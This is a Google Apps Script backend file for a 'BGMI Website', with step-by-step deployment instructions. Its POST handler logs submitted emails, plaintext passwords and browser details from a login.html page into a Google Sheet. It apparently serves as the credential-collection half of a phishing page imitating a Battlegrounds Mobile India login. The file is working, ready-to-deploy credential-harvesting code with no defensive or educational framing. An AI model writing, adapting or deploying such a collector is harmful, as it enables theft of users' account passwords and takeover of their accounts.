/**
 * BGMI Website — Google Apps Script Backend
 * ==========================================
 * HOW TO SET UP:
 * 1. Open your Google Sheet
 * 2. Click: Extensions → Apps Script
 * 3. Delete any existing code and paste this entire file
 * 4. Click: Deploy → New Deployment
 * 5. Type: Web App
 * 6. Execute as: Me
 * 7. Who has access: Anyone
 * 8. Click Deploy → Copy the URL
 * 9. Paste the URL into public/login.html  (replace PASTE_YOUR_APPS_SCRIPT_URL_HERE)
 *
 * SHEET SETUP:
 * Row 1 should have these headers:
 * A1: Timestamp  |  B1: Email  |  C1: Password  |  D1: User Agent
 */

function doPost(e) {
    try {
        var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
        var data = JSON.parse(e.postData.contents);

        sheet.appendRow([
            new Date().toISOString(),   // Column A: Timestamp
            data.email || "",        // Column B: Email / Phone
            data.password || "",        // Column C: Password
            data.userAgent || ""        // Column D: Browser info
        ]);

        return ContentService
            .createTextOutput(JSON.stringify({ status: "success" }))
            .setMimeType(ContentService.MimeType.JSON);

    } catch (err) {
        return ContentService
            .createTextOutput(JSON.stringify({ status: "error", message: err.toString() }))
            .setMimeType(ContentService.MimeType.JSON);
    }
}

// Handles preflight/GET requests (needed for some browsers)
function doGet(e) {
    return ContentService
        .createTextOutput("BGMI Logger is running.")
        .setMimeType(ContentService.MimeType.TEXT);
}
